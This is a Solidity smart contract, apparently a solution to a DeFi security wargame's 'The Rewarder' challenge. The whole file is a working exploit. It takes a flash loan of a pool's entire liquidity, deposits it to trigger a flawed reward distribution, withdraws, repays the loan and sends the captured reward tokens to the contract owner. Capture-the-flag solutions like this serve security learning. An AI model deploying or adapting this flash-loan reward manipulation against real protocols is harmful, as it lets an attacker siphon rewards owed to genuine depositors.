// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;


import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "../Attacker.sol";

interface IRewarderPool {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function distributeRewards() external;
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

/**
 * @title Attacker
 * @dev This contract is used to exploit the "TheRewarderPool" contract's vulnerability.
 * @author Kristian Apostolov @CrisCodesCrap
 */
contract TheRewarderAttacker is Attacker {

    IFlashLoanerPool private immutable flashLoanerPool;
    IRewarderPool private immutable rewarderPool;
    IERC20 private immutable rewardToken;
    IERC20 private immutable liquidityToken;

    constructor(address _flashLoanerPool,address _rewarderPool, address _rewardToken, address _liquidityToken) {
        flashLoanerPool = IFlashLoanerPool(_flashLoanerPool);
        rewarderPool = IRewarderPool(_rewarderPool);
        rewardToken = IERC20(_rewardToken);
        liquidityToken = IERC20(_liquidityToken);
    }

    function startAttack() external override {
        // Getting a flash loan
        flashLoanerPool.flashLoan(liquidityToken.balanceOf(address(flashLoanerPool)));
    }

    function receiveFlashLoan(uint256 amount) external {
        
        // Depositing the flash loan
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);

        // Using the flawed rewarder mechanism
        rewarderPool.distributeRewards();

        // Withdrawing the flash loan
        rewarderPool.withdraw(amount);

        // Repaying the flash loan
        liquidityToken.transfer(msg.sender, amount);

        // Sending the reward tokens to the owner
        rewardToken.transfer(owner(), rewardToken.balanceOf(address(this)));
    }

}